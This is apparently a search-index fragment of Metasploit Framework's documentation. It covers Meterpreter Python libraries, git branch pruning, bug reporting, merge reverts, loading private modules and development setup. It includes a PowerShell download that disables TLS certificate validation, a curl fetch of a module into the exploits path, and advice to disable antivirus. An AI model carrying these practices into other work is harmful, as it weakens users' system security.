encodings.iso8859_6 encodings.iso8859_7 encodings.iso8859_8 encodings.iso8859_9 encodings.koi8_r encodings.koi8_u encodings.latin_1 encodings.mac_arabic encodings.mac_centeuro encodings.mac_croatian encodings.mac_cyrillic encodings.mac_farsi encodings.mac_greek encodings.mac_iceland encodings.mac_latin2 encodings.mac_roman encodings.mac_romanian encodings.mac_turkish encodings.mbcs encodings.palmos encodings.ptcp154 encodings.punycode encodings.quopri_codec encodings.raw_unicode_escape encodings.rot_13 encodings.string_escape encodings.tis_620 encodings.undefined encodings.unicode_escape encodings.unicode_internal encodings.utf_16 encodings.utf_16_be encodings.utf_16_le encodings.utf_32 encodings.utf_32_be encodings.utf_32_le encodings.utf_7 encodings.utf_8 encodings.utf_8_sig encodings.uu_codec encodings.zlib_codec filecmp fileinput fnmatch formatter fpformat fractions ftplib functools genericpath getopt getpass gettext glob gzip hashlib heapq hmac htmlentitydefs htmllib HTMLParser httplib ihooks imaplib imghdr importlib imputil inspect io json json.decoder json.encoder json.scanner json.tool keyword linecache locale logging logging.config logging.handlers macpath macurl2path mailbox mailcap markupbase md5 meterpreter meterpreter.core meterpreter.elevate meterpreter.fs meterpreter.incognito meterpreter.kiwi meterpreter.sys meterpreter.tlv meterpreter.transport meterpreter.user meterpreter.extapi meterpreter.extapi.adsi mhlib mimetools mimetypes MimeWriter modulefinder multifile multiprocessing multiprocessing.connection multiprocessing.forking multiprocessing.heap multiprocessing.managers multiprocessing.pool multiprocessing.process multiprocessing.queues multiprocessing.reduction multiprocessing.sharedctypes multiprocessing.synchronize multiprocessing.util multiprocessing.dummy multiprocessing.dummy.connection mutex netrc new nntplib ntpath nturl2path numbers opcode optparse os os2emxpath pdb pickle pickletools pipes pkgutil platform plistlib popen2 poplib posixfile posixpath pprint profile pstats py_compile pyclbr pydoc Queue quopri random re repr rexec rfc822 rlcompleter robotparser runpy sched sets sgmllib sha shelve shlex shutil SimpleHTTPServer SimpleXMLRPCServer site smtplib sndhdr socket SocketServer sre sre_compile sre_constants sre_parse ssl stat statvfs string StringIO stringold stringprep struct subprocess sunau sunaudio symbol symtable sysconfig tabnanny tarfile telnetlib tempfile textwrap this threading timeit toaiff token tokenize trace traceback types urllib urllib2 urlparse user UserDict UserList UserString uu uuid warnings wave weakref webbrowser whichdb wsgiref wsgiref.handlers wsgiref.headers wsgiref.simple_server wsgiref.util wsgiref.validate xdrlib xml xml.dom xml.dom.domreg xml.dom.expatbuilder xml.dom.minicompat xml.dom.minidom xml.dom.NodeFilter xml.dom.pulldom xml.dom.xmlbuilder xml.etree xml.etree.ElementInclude xml.etree.ElementPath xml.etree.ElementTree xml.parsers xml.sax xml.sax._exceptions xml.sax.handler xml.sax.saxutils xml.sax.xmlreader xmllib xmlrpclib zipfile . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#currently-loadable-native-libraries",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/python-extension.html#currently-loadable-native-libraries"
  },"524": {
    "doc": "Python Extension",
    "title": "Python Extension",
    "content": " ",
    "url": "/docs/using-metasploit/advanced/meterpreter/python-extension.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/python-extension.html"
  },"525": {
    "doc": "Remote Branch Pruning",
    "title": "Back up the repo",
    "content": "Clone a new metasploit-framework.git repository: . todb@presto:~/github/todb-r7$ git clone github_r7:rapid7/metasploit-framework.git msf-backup.git . Go there and check out every remote branch we’ve got. That way, if you screw up and delete something important, you can add it back in later from this backup clone. todb@presto:~/github/todb-r7$ cd msf-backup.git `todb@presto:~/github/todb-r7/metasploit-framework$ for b in `git branch -r | grep -v \"HEAD -&gt; origin\" | sed 's/^ origin\\///'`; do git checkout -b $b --track origin/$b; done . Tarball it out of the way. todb@presto:~/github/todb-r7$ cd .. todb@presto:~/github$ tar zxvf msf-backup.git.tar.gz todb@presto:~/github$ rm -rf msf-backup.git . ",
    "url": "/docs/development/get-started/git/remote-branch-pruning.html#back-up-the-repo",
    "relUrl": "/docs/development/get-started/git/remote-branch-pruning.html#back-up-the-repo"
  },"526": {
    "doc": "Remote Branch Pruning",
    "title": "Make a new clone",
    "content": "Now, clone metasploit again. I do this because I have like 20 remotes to deal with on my “real” clone and I don’t want to have to grep through all my origin vs non-origin stuff. mazikeen:./rapid7$ git clone github_r7:rapid7/metasploit-framework.git msf-prune . Now start figuring out what branches to delete. First, wipe out anything that responds to prune. Usually that’s not a lot. mazikeen:./msf-prune$ git prune remote origin . Next, take a look at what’s already merged and what’s not. We can drop most of the merged stuff right away. mazikeen:./msf-prune$ git branch -r --merged mazikeen:./msf-prune$ git branch -r --no-merged . That gives a pretty good idea of how many branches we’re talking about. ",
    "url": "/docs/development/get-started/git/remote-branch-pruning.html#make-a-new-clone",
    "relUrl": "/docs/development/get-started/git/remote-branch-pruning.html#make-a-new-clone"
  },"527": {
    "doc": "Remote Branch Pruning",
    "title": "Start deleting old, merged branches",
    "content": "Here’s a one-liner, lightly modified from http://stackoverflow.com/questions/2514172/listing-each-branch-and-its-last-revisions-date-in-git#2514279 which lists all remote merged branches in date order. mazikeen:./msf-prune$ for k in `git branch -r --merged |grep -v \"HEAD -&gt;\" | sed s/^..//`; do echo -e `git log -1 --pretty=format:\"%Cgreen%ci %Cblue%cr%Creset\" $k --`\\\\t\"$k\";done | sort . Count off how many you want to keep at the end, do the arithmetic, and tack on another couple pipes to catch everything that’s more than two weeks old. These are the merged branches that nobody’s likely to miss. mazikeen:./msf-prune$ for k in `git branch -r --merged |grep -v \"HEAD -&gt;\" | sed s/^..//`; do echo -e `git log -1 --pretty=format:\"%Cgreen%ci %Cblue%cr%Creset\" $k --`\\\\t\"$k\";done | sort | head -45 | sed \"s/^.*origin\\///\" &gt; /tmp/merged_to_delete.txt . Pull the trigger: . mazikeen:./msf-prune$ for b in `cat /tmp/merged_to_delete.txt`; do echo Deleting $b &amp;&amp; git push origin :$b; done . Note that we still have our tarball, so if we need to reinstate any of these branches, just need to re-push. ",
    "url": "/docs/development/get-started/git/remote-branch-pruning.html#start-deleting-old-merged-branches",
    "relUrl": "/docs/development/get-started/git/remote-branch-pruning.html#start-deleting-old-merged-branches"
  },"528": {
    "doc": "Remote Branch Pruning",
    "title": "Repeat for the unmerged branches",
    "content": "Pretty much the same as above, but use --no-merged instead of --merged and allow for older unmerged branches (say, 2 months). ",
    "url": "/docs/development/get-started/git/remote-branch-pruning.html#repeat-for-the-unmerged-branches",
    "relUrl": "/docs/development/get-started/git/remote-branch-pruning.html#repeat-for-the-unmerged-branches"
  },"529": {
    "doc": "Remote Branch Pruning",
    "title": "Tell people about it.",
    "content": "Sometimes, some people may run into sync problems with these missing branches and need to git remote prune origin themselves. Alternatively, they want to look into these branches again – especially the unmerged ones. So, let people know that you just did this on the metasploit-hackers list and the Freenode IRC channel. If someone wants an old branch back, just go to your backup clone and push it back up as you would any branch: git checkout branchname &amp;&amp; git push origin branchname. No problem. ",
    "url": "/docs/development/get-started/git/remote-branch-pruning.html#tell-people-about-it",
    "relUrl": "/docs/development/get-started/git/remote-branch-pruning.html#tell-people-about-it"
  },"530": {
    "doc": "Remote Branch Pruning",
    "title": "Remote Branch Pruning",
    "content": "Since we have a lot of people creating and merging branches on the Metasploit GitHub repository, we need to periodically get rid of old and abandoned branches. Here’s my technique: . ",
    "url": "/docs/development/get-started/git/remote-branch-pruning.html",
    "relUrl": "/docs/development/get-started/git/remote-branch-pruning.html"
  },"531": {
    "doc": "Reporting a Bug",
    "title": "Metasploit Bug Reporting",
    "content": "Metasploit gets hundreds of issue reports every year on our issue tracker. Some issues aren’t bug reports at all, but instead requests for new features or questions about Metasploit usage. We appreciate feature or enhancement requests, and you should feel free to keep submitting those to our issue tracker. Some questions, such as whether an odd error or behavior is intended, are okay to submit to the issue tracker as well. Other questions, such as basic support requests or questions on beginning Framework usage, are better to ask the community on Slack. If you believe you have discovered a legitimate bug in Metasploit Framework, you should open a bug report on our issue tracker. The rest of this page will discuss how to submit detailed, useful bug reports so we can understand and triage your issue as quickly as possible. But first…two important exceptions to bug/issue reports. ",
    "url": "/docs/using-metasploit/getting-started/reporting-a-bug.html#metasploit-bug-reporting",
    "relUrl": "/docs/using-metasploit/getting-started/reporting-a-bug.html#metasploit-bug-reporting"
  },"532": {
    "doc": "Reporting a Bug",
    "title": "When NOT to use Metasploit’s issue tracker",
    "content": "NOTE: There are two situations where, even if you have found what you know is a bug, you should not open a bug report on our public issue tracker. | You should not open a bug report on Metasploit Framework’s issue tracker if you are a Metasploit Pro customer. | You should not open a bug report when you have found a security issue with Metasploit itself. | . Metasploit Pro Customers . If you are a Metasploit Pro customer, you can log in to Rapid7’s customer support portal here. You are also able to reach out to your CSM or support representative if you prefer. To provide a consistent customer experience, Metasploit Framework community members, committers, and open-source developers do not offer support for commercial Rapid7 products. Rapid7’s support resources and team members are well-equipped to handle your Metasploit Pro support needs! . Security Issues . If you have a security issue with Metasploit itself, you should email security@rapid7.com or let us know here. Rapid7’s disclosure policy is here. In general, our security teams are happy to give you credit, inform you about progress, and explore related issues with you if you’d like. They’re also happy to keep you anonymous if that’s what you prefer. All of this is significantly easier if you report security issues in a manner that lets our teams quickly work with you to understand the problem! Clear communication and coordinated disclosure give us the best chance of fixing any security issues quickly and protecting users. Now on to the good stuff! The Metasploit development community has read thousands of bug reports over the past 15 years, and a well-written bug report makes fixing bugs much faster and easier. In fact, in our experience, how quickly we can understand and fix an issue has more to do with bug report quality than the complexity of the bug itself. ",
    "url": "/docs/using-metasploit/getting-started/reporting-a-bug.html#when-not-to-use-metasploits-issue-tracker",
    "relUrl": "/docs/using-metasploit/getting-started/reporting-a-bug.html#when-not-to-use-metasploits-issue-tracker"
  },"533": {
    "doc": "Reporting a Bug",
    "title": "General Rules",
    "content": ". | Ensure the platform you’re reporting the issue for is supported. We do not, for instance, support Termux currently. If your platform is not officially supported, the community may still have resources to help, but you should search for and ask about those outside Metasploit’s issue tracker. | When possible, it helps if you are running the latest stable version of Metasploit Framework, or the latest release of Kali, BlackArch Linux, or your other favorite security distribution that ships with Metasploit. Metasploit’s nightly installers are here and typically offer the latest Framework release. | Review our code of conduct before submitting issues. | Use a specific title so we can understand immediately which part of Metasploit is causing the unexpected behavior. “NoMethodError raised on smb_login module” is a great title. “Problem with Metasploit target” is not. | Redact any private or sensitive data, such as target IPs or URLs, passwords, or personally identifying information. | Please don’t comment on closed issues; instead, open a new issue and link to any previous relevant issues. | . ",
    "url": "/docs/using-metasploit/getting-started/reporting-a-bug.html#general-rules",
    "relUrl": "/docs/using-metasploit/getting-started/reporting-a-bug.html#general-rules"
  },"534": {
    "doc": "Reporting a Bug",
    "title": "Information to Include",
    "content": "We ask for several different pieces of information when users report issues in Metasploit. As of June 2020, our core engineering team in Belfast is developing a debug command that will automatically give you all the information we require when you encounter an issue and then run the command in msfconsole. For now, the following information ensures that we can more effectively triage and address bugs. If you do not provide this information, it is likely that response time will be significantly longer! . Steps to reproduce . What did you do to get the results you got? Can you give us step-by-step instructions to get the same results you got? Are you able to consistently reproduce the issue in your own environment? . Which OS are you using? What do we need to know about your environment and/or target? . Tell us which operating system you’re using and any relevant information about your setup. If the module or feature you’re having trouble with requires any external dependencies, check whether they are installed, and (if not) whether installing them could solve your problem. If you’re having problems with a target (victim), tell us the target operating system and service versions.(Please ensure you’ve redacted any private or sensitive data!) If the module or feature you’re having trouble with requires any external dependencies, check whether that could solve your problem. If you’re testing a module in a lab or virtual environment, we would appreciate as much data about the target as you can provide. This means exact versions of the target including patch levels, pcaps if you can capture them, and any kind of logging inside or outside of Framework. We will often ask for the framework.log. Expected behavior . What should happen? If what you’re trying to do used to work but no longer does, what was the behavior you encountered before you ran into a problem? . Current behavior . What happens now? Please give us as many technical details as possible. Once again, we also strongly recommend that you send us any relevant logs and/or stack traces. In case you haven’t noticed by now, we absolutely love logs and screen captures, and your including them will make us happy. Metasploit version . Get this with the version command in msfconsole (or git log -1 --pretty=oneline for a source install). Did you install Metasploit with… . | Kali package via apt | Omnibus installer (nightly) | Commercial installer (from https://www.rapid7.com/products/metasploit/download/) | Source install (please specify Ruby version) | . This list isn’t intended to be exhaustive - it’s simply the bare minimum set of details we need to reproduce and diagnose your bug. You should feel free to include as much detailed information as you need to help us understand how you got the results you did. ",
    "url": "/docs/using-metasploit/getting-started/reporting-a-bug.html#information-to-include",
    "relUrl": "/docs/using-metasploit/getting-started/reporting-a-bug.html#information-to-include"
  },"535": {
    "doc": "Reporting a Bug",
    "title": "Avoid Duplicates",
    "content": "You may not be the first person to notice the problem you’re seeing as a Framework user, and the more bug reports we get, the more difficult it is to sort through them all for easy fixes or high-priority issues. Here are some ways to help a previously-reported bug get noticed more quickly and prioritized (if necessary). | Having a problem with a module? Try searching that module’s name to see if anyone else has reported (or fixed!) your problem recently. | Getting a strange error and not sure what it means? Search for the error to see if others have had or addressed the same problem you are facing. | Pro tip: Search both open and closed issues to see if what you’re reporting was resolved (in which case you might simply need to update to a later version of Metasploit) or if there’s a workaround someone else has discovered that might help you while we get to your issue. | If you DO discover that someone else has already reported the issue you’re experiencing, please do update that issue with any new information - for instance, that you’re experiencing the issue on a different OS or in a different version of Metasploit than what the original issue reports described. | If you find closed issues or resolved bugs that describe a problem you’re having on a later version of Metasploit, that could indicate a regression (old bugs that have been reintroduced). It helps us if you note this in your issue report. Fixes for regressions can be fast, so making note of possible regressions is useful. | Finally, you might find a bug that’s been rejected or closed without resolution. In many of these cases, the problem is something external to Metasploit: user error, configuration issues, known incompatibilities, etc. If you think that the original resolution was in error or incomplete, open a new issue report and refer to any related issue reports. | . ",
    "url": "/docs/using-metasploit/getting-started/reporting-a-bug.html#avoid-duplicates",
    "relUrl": "/docs/using-metasploit/getting-started/reporting-a-bug.html#avoid-duplicates"
  },"536": {
    "doc": "Reporting a Bug",
    "title": "Other Notes",
    "content": ". | Networking is hard, as we’ve often said even among ourselves! You might want to see if your network configuration is unusual in any way, or do a regular old internet search to check whether your config might be the problem. | Antivirus frequently causes strange behavior. Ensure antivirus is disabled on your system or in any VMs where you’re using Metasploit. | GitHub pull requests frequently contain a LOT of conversation and context. If a bug already has a pull request associated with it, check the pull request conversation for other information that might be useful to you. | . ",
    "url": "/docs/using-metasploit/getting-started/reporting-a-bug.html#other-notes",
    "relUrl": "/docs/using-metasploit/getting-started/reporting-a-bug.html#other-notes"
  },"537": {
    "doc": "Reporting a Bug",
    "title": "PRs Accepted!",
    "content": "If you’re a superhero and you figured out the root cause of a bug AND found a way to fix it, you can send your Metasploit fixes and improvements our way! The best way to get your fix into Metasploit quickly is to patch your own fork and submit a pull request to Metasploit. You get extra gratitude from all of us when you do this, and you’ll also get a shout-out in the weekly Metasploit wrap-up. You can find a guide on setting up your own Metasploit Development Environment here. ",
    "url": "/docs/using-metasploit/getting-started/reporting-a-bug.html#prs-accepted",
    "relUrl": "/docs/using-metasploit/getting-started/reporting-a-bug.html#prs-accepted"
  },"538": {
    "doc": "Reporting a Bug",
    "title": "Public Discussion",
    "content": "Some projects and companies don’t like discussing bugs in the bug report itself. Some even have policies of not doing this. Metasploit is not one of those projects. We greatly prefer public communication over private communication because it makes community knowledge accessible and searchable to everyone. That said, if you have specific privacy or security concerns, we’re always happy to speak privately. You can get in touch with us at msfdev@metasploit.com. ",
    "url": "/docs/using-metasploit/getting-started/reporting-a-bug.html#public-discussion",
    "relUrl": "/docs/using-metasploit/getting-started/reporting-a-bug.html#public-discussion"
  },"539": {
    "doc": "Reporting a Bug",
    "title": "Resolved Bugs",
    "content": "Your bug should be considered “Resolved” once there’s a fix landed in the Metasploit-Framework master branch. People who track that branch will have the fix available quickly. It may take other distributions that include Metasploit (e.g., Kali) a few days to pull in fixes, depending on their individual release cadences. Thanks for helping us get to diagnoses and resolutions quickly and efficiently for all Framework users! . ",
    "url": "/docs/using-metasploit/getting-started/reporting-a-bug.html#resolved-bugs",
    "relUrl": "/docs/using-metasploit/getting-started/reporting-a-bug.html#resolved-bugs"
  },"540": {
    "doc": "Reporting a Bug",
    "title": "Reporting a Bug",
    "content": " ",
    "url": "/docs/using-metasploit/getting-started/reporting-a-bug.html",
    "relUrl": "/docs/using-metasploit/getting-started/reporting-a-bug.html"
  },"541": {
    "doc": "Rolling back merges",
    "title": "What’s a bad merge?",
    "content": ". | Anything that causes Travis-CI to fail rspec tests consistently. | Anything that hits untested code that otherwise causes problems with msfconsole, msfcli, msfvenom, and other console commands. | . Sometimes, Travis-CI does choke up, due to network weather. Every build is a fresh clone, and all gems have to be reinstalled every time. Also, some rspec tests require network connections to assets on the Internet. Sometimes, Travis-CI itself is under a lot of load, and builds time out. The best way to diagnose these problems is simply to restart the build. Note, only Committers have rights to do this. If that doesn’t clear things up, or if it’s obvious that there are real failures (since you’ve read the rspec results and have read the tests), the first order of business is to undo your bad commit. Note: in branches other than master, you can usually just fix things normally with new commits. There are plenty of “whoops” commit messages in our history. ",
    "url": "/docs/development/maintainers/process/rolling-back-merges.html#whats-a-bad-merge",
    "relUrl": "/docs/development/maintainers/process/rolling-back-merges.html#whats-a-bad-merge"
  },"542": {
    "doc": "Rolling back merges",
    "title": "A merge revert example",
    "content": "Once, there was a bad merge on PR #2320. The fellow landing this pull request ran into a merge conflict while landing, thought he fixed it, and pushed the results, which ended up breaking about a dozen Rspec tests. Whoops. That was a bad merge. PR #2624 fixed it. Here’s the procedure used. Figure out what broke things. In this case, the failed build was pretty obvious: Build #5216 was red, and rerunning Travis-CI didn’t solve. Reading the build log, we can see this was merge commit 3996557. Check out the bad merge tip. These commands will put the local repo back to the bad merge, and create a local branch as such: . git checkout 3996557 git checkout -b bad-merge . You can inspect exactly what commits are contained in this merge with the following: . git log bad-merge...bad-merge~ --oneline . Like so: . $ git log bad-merge...bad-merge~ --oneline 3996557 Fix conflcit lib/msf/util/exe.rb 6296c4f Merge pull request #9 from tabassassin/retab/pr/2320 d0a3ea6 Retab changes for PR #2320 bff7d0e Merge for retab 4c9e6a8 Default to exe-small . The syntax is a little wacky, but this is saying, “Show me all the commit hashes that occur from the bad-merge point to one back from bad-merge (in other words, from right before bad-merge was merged). That’s what the tilde (~) means. You could also use bad-merge^ or bad-merge^1, they’re all equivalent. You can see the diff with the following command. Note the reverse placement of the bad-merge and bad-merge~ commit points! . git diff bad-merge~ bad-merge . Take a look at that, confirm that yes, this is exactly what you want to revert, and then pull the trigger. Revert the merge . git revert -m 1 bad-merge . The -m 1 bit is important, because that specifies that you want the branch to return to the point from before the merge – I have never had reason to revert a merge and throw out the other side of the merge, but I imagine it comes up often enough for other people to not have it be the default behavior. Note that this does /not/ reach into the repo and change history; for that, you would need to git push –force, and you never want to do that on the master branch. Instead, you are generating a new commit that reverses the contents of the merge commit. As usual, you will want to edit the commit message to be meaningful – mention the affected commit hash and the affected pull request. You will also want to git commit -S --amend after this to sign the commit; git revert does not take a -S option. Bummer. Create a new PR. You will now create a new PR with your revert commit. That’s simple enough. Again, be sure that the affected PRs are also informed; they may think their material landed, and while it technically did, it’s no longer there; they will need to open new PRs and figure out how to resubmit their changes (hopefully, this time without causing merge conflicts). Bug the committers until your revert lands. Until your revert commit lands, master will remain broken, so dealing with this situation should be blocking basically anything else. Be vocal. ",
    "url": "/docs/development/maintainers/process/rolling-back-merges.html#a-merge-revert-example",
    "relUrl": "/docs/development/maintainers/process/rolling-back-merges.html#a-merge-revert-example"
  },"543": {
    "doc": "Rolling back merges",
    "title": "That’s it!",
    "content": "If you have suggestions for fixes on this page, please bother @todb-r7 with them. ",
    "url": "/docs/development/maintainers/process/rolling-back-merges.html#thats-it",
    "relUrl": "/docs/development/maintainers/process/rolling-back-merges.html#thats-it"
  },"544": {
    "doc": "Rolling back merges",
    "title": "Rolling back merges",
    "content": "Since the Metasploit-framework repository’s master branch is the bleeding edge of development, occasionally mistakes happen. This page will attempt to give some guidance on how to roll back a bad merge. ",
    "url": "/docs/development/maintainers/process/rolling-back-merges.html",
    "relUrl": "/docs/development/maintainers/process/rolling-back-merges.html"
  },"545": {
    "doc": "Running Private Modules",
    "title": "Mirror the “real” Metasploit module paths",
    "content": "You must first set up a directory structure that fits with Metasploit’s expectations of path names. What this typically means is that you should first create an “exploits” directory structure, like so: . mkdir -p $HOME/.msf4/modules/exploits . If you are using auxiliary or post modules, or are writing payloads you’ll want to mkdir those as well. ",
    "url": "/docs/using-metasploit/intermediate/running-private-modules.html#mirror-the-real-metasploit-module-paths",
    "relUrl": "/docs/using-metasploit/intermediate/running-private-modules.html#mirror-the-real-metasploit-module-paths"
  },"546": {
    "doc": "Running Private Modules",
    "title": "Create an appropriate category",
    "content": "Modules are sorted by (somewhat arbitrary) categories. These can be anything you like; I usually use test or private, but if you are developing a module with an eye toward providing it to the main Metasploit distribution, you will want to mirror the real module path. For example: . mkdir -p $HOME/.msf4/modules/exploits/windows/fileformat . … if you are developing a file format exploit for Windows. ",
    "url": "/docs/using-metasploit/intermediate/running-private-modules.html#create-an-appropriate-category",
    "relUrl": "/docs/using-metasploit/intermediate/running-private-modules.html#create-an-appropriate-category"
  },"547": {
    "doc": "Running Private Modules",
    "title": "Create the module",
    "content": "Once you have a directory to place it in, feel free to download or start writing your module. ",
    "url": "/docs/using-metasploit/intermediate/running-private-modules.html#create-the-module",
    "relUrl": "/docs/using-metasploit/intermediate/running-private-modules.html#create-the-module"
  },"548": {
    "doc": "Running Private Modules",
    "title": "Using Python/Go modules",
    "content": "External modules, most commonly written in Python/Go, need to additionally be marked as executable in order to be loaded by Metasploit. For full details: . | Writing External Python Modules | Writing External GoLang Modules | . ",
    "url": "/docs/using-metasploit/intermediate/running-private-modules.html#using-pythongo-modules",
    "relUrl": "/docs/using-metasploit/intermediate/running-private-modules.html#using-pythongo-modules"
  },"549": {
    "doc": "Running Private Modules",
    "title": "Test it all out",
    "content": "If you already have msfconsole running, use a reload_all command to pick up your new modules. If not, just start msfconsole and they’ll be picked up automatically. If you’d like to test with something generic, I have a module posted up as a gist, here: https://gist.github.com/todb-r7/5935519, so let’s give it a shot: . mkdir -p $HOME/.msf4/modules/exploits/test curl -Lo ~/.msf4/modules/exploits/test/test_module.rb https://gist.github.com/todb-r7/5935519/raw/17f7e40ab9054051c1f7e0655c6f8c8a1787d4f5/test_module.rb todb@ubuntu:~$ mkdir -p $HOME/.msf4/modules/exploits/test todb@ubuntu:~$ curl -Lo ~/.msf4/modules/exploits/test/test_module.rb https://gist.github.com/todb-r7/5935519/raw/6e5d2da61c82b0aa8cec36825363118e9dd5f86b/test_module.rb % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1140 0 1140 0 0 3607 0 --:--:-- --:--:-- --:--:-- 7808 . Then, in my msfconsole window: . msf &gt; reload_all [*] Reloading modules from all module paths... IIIIII dTb.dTb _.---._ II 4' v 'B .'\"\".'/|\\`.\"\"'. II 6.P : .' / | \\ `. : II 'T;.;P' '.' / | \\ `.' II 'T; ;P' `. / | \\ .' IIIIII 'YvP' `-.__|__.-' I love shells --egypt =[ metasploit v4.6.2-2013052901 [core:4.6 api:1.0] + -- --=[ 1122 exploits - 707 auxiliary - 192 post + -- --=[ 307 payloads - 30 encoders - 8 nops msf &gt; use exploit/test/test_module msf exploit(test_module) &gt; info Name: Fake Test Module Module: exploit/test/test_module Version: 0 Platform: Windows Privileged: No License: Metasploit Framework License (BSD) Rank: Excellent Provided by: todb &lt;todb@metasploit.com&gt; Available targets: Id Name -- ---- 0 Universal Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- DATA Hello, world! yes The output data Payload information: Description: If this module loads, you know you're doing it right. References: https://cvedetails.com/cve/1970-0001/ msf exploit(test_module) &gt; exploit [*] Started reverse handler on 192.168.145.1:4444 [+] Hello, world! msf exploit(test_module) &gt; . ",
    "url": "/docs/using-metasploit/intermediate/running-private-modules.html#test-it-all-out",
    "relUrl": "/docs/using-metasploit/intermediate/running-private-modules.html#test-it-all-out"
  },"550": {
    "doc": "Running Private Modules",
    "title": "Troubleshooting",
    "content": "That’s really all there is to it. The most common problems that people (including myself) run into are: . | Attempting to create a module in $HOME/.msf4/modules/. This won’t work because you need to specify if it’s an exploit or a payload or something. Check ls /opt/metasploit/apps/pro/msf3/modules/ (or where your install of Metasploit lives). | Attempting to create a module in $HOME/.msf4/modules/auxiliary/. This won’t work because you need at least one level of categorization. It can be new, like auxiliary/0day/, or existing, like auxiliary/scanner/scada/. | Attempting to create a module in $HOME/.msf4/exploit/ or $HOME/.msf4/posts/. Note the pluralization of the directory names; they’re different for different things. Exploits, payloads, encoders, and nops are plural, while auxiliary and post are singular. | . Metasploit Pro . Note that the $HOME directory for Metasploit Community Edition is going to be root and not your own user directory, so if you are expecting modules to show up in the Metasploit Pro web UIs, you will want to stash your external modules in /root/.msf4/modules. Of course, this means you need root access to the machine in question, but hey, you’re a l33t Metasploit user, so that shouldn’t be too hard. Also note that if your modules are not displaying in the web UI, you should restart Pro service. Windows . For Windows users, the above is all true, except for accessing the modules from the web GUI. Sadly, you’re a little out of luck; the module load paths on Windows are a little more restrictive and don’t allow for external modules. However, the Console2-based Metasploit Console (Start &gt; Programs &gt; Metasploit &gt; Metasploit Console) will work out just fine. New mixins and protocols . Any module that requires on changes to core library functions, such as new protocol parsers or other library mixins, aren’t going to work out for you this way – you’re going to end up spewing errors all over the place as your module tries to load these classes. It’s possible to write modules as completely self-contained in nearly all cases (thanks to Ruby’s open class architecture), but such modules nearly always get refactored later to make the protocol and other mixin bits available to other modules. In this case, it would be better to work with modules like that using a proper GitHub checkout with a development branch – see the dev environment setup docs for tons more on that. ",
    "url": "/docs/using-metasploit/intermediate/running-private-modules.html#troubleshooting",
    "relUrl": "/docs/using-metasploit/intermediate/running-private-modules.html#troubleshooting"
  },"551": {
    "doc": "Running Private Modules",
    "title": "A final warning",
    "content": "If you are loading new and exciting Metasploit modules, know that these things will tend to have access to anything you have access to; doubly so if you’re dropping them in root. Metasploit modules are plain text Ruby, so you can read them – but please be careful, and only add external modules from trusted sources; don’t just go grabbing any old thing you see on the Internet, because you may find yourself backdoored (or worse) in short order. ",
    "url": "/docs/using-metasploit/intermediate/running-private-modules.html#a-final-warning",
    "relUrl": "/docs/using-metasploit/intermediate/running-private-modules.html#a-final-warning"
  },"552": {
    "doc": "Running Private Modules",
    "title": "Running Private Modules",
    "content": "If you’re in the business of writing or collecting Metasploit modules that aren’t part of the standard distribution, then you need a convenient way to load those modules in Metasploit. Never fear, it’s pretty easy, using Metasploit’s default local module search path, $HOME/.msf4/modules, and there are just a couple caveats: . ",
    "url": "/docs/using-metasploit/intermediate/running-private-modules.html",
    "relUrl": "/docs/using-metasploit/intermediate/running-private-modules.html"
  },"553": {
    "doc": "Sanitizing PCAPs",
    "title": "Kali Linux",
    "content": "tcprewrite can be used to change the IP and MAC addresses. The following command will take care of both of those: tcprewrite --seed=&lt;int&gt; --infile=&lt;infile&gt; --outfile=&lt;outfile&gt; --dlt=enet --enet-dmac=&lt;dmac&gt; --enet-smac=&lt;smac&gt; . | seed is used to seed changes to IP address. Pick a number for here, 111 is acceptable. | dlt fixes an error: dlt_linux_ssl plugin does not support packet encoding | enet-dmac fixes the destination mac. 00:00:00:00:00:00 works | enet-smac fixes the source mac. 11:11:11:11:11:11 works | . ",
    "url": "/docs/development/get-started/sanitizing-pcaps.html#kali-linux",
    "relUrl": "/docs/development/get-started/sanitizing-pcaps.html#kali-linux"
  },"554": {
    "doc": "Sanitizing PCAPs",
    "title": "Sanitizing PCAPs",
    "content": "Before submitting a pcap to msfdev@metasploit.com, you may choose to sanitize it. Mainly, you’ll want to change the mac addresses and IP addresses. ",
    "url": "/docs/development/get-started/sanitizing-pcaps.html",
    "relUrl": "/docs/development/get-started/sanitizing-pcaps.html"
  },"555": {
    "doc": "Setting Up a Metasploit Development Environment",
    "title": "Assumptions",
    "content": ". | You have installed an apt-based Linux environment, such as Ubuntu or Kali. | You have created a GitHub account and associated an public ssh key with it. | You have familiarity with Git and Github, or have completed the Github bootcamp. | For optional database and REST API functionality, you will need regular user account that is not root. | . This guide has details for setting up both Linux and Windows. ",
    "url": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html#assumptions",
    "relUrl": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html#assumptions"
  },"556": {
    "doc": "Setting Up a Metasploit Development Environment",
    "title": "Install dependencies",
    "content": ". | Open a terminal on your Linux host and set up Git, build tools, and Ruby dependencies: | . sudo apt update &amp;&amp; sudo apt install -y git autoconf build-essential libpcap-dev libpq-dev zlib1g-dev libsqlite3-dev . If you are running a Windows machine . | Install chocolatey | Install Ruby | Install pcaprub dependencies from your cmd.exe terminal: ``` powershell -Command “[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile(‘https://www.winpcap.org/install/bin/WpdPack_4_1_2.zip’, ‘C:\\Windows\\Temp\\WpdPack_4_1_2.zip’)” | . choco install 7zip.installServerCertificateValidationCallback 7z x “C:\\Windows\\Temp\\WpdPack_4_1_2.zip” -o”C:\" . 4. Install a version of PostgreSQL: . choco install postgresql12 . ## Set up your local copy of the repository You will need to use Github to create a fork for your contributions and receive the latest updates from our repository. 1. Login to Github and click the \"Fork\" button in the top-right corner of the [metasploit-framework] repository. 2. Create a `git` directory in your home folder and clone your fork to your local machine: ```bash export GITHUB_USERNAME=YOUR_USERNAME_FOR_GITHUB export GITHUB_EMAIL=YOUR_EMAIL_ADDRESS_FOR_GITHUB mkdir -p ~/git cd ~/git git clone git@github.com:$GITHUB_USERNAME/metasploit-framework cd ~/git/metasploit-framework . | If you encounter a “permission denied” error on the above command, research the error message. If there isn’t an explicit reason given, confirm that your Github SSH key is configured correctly. You will need to 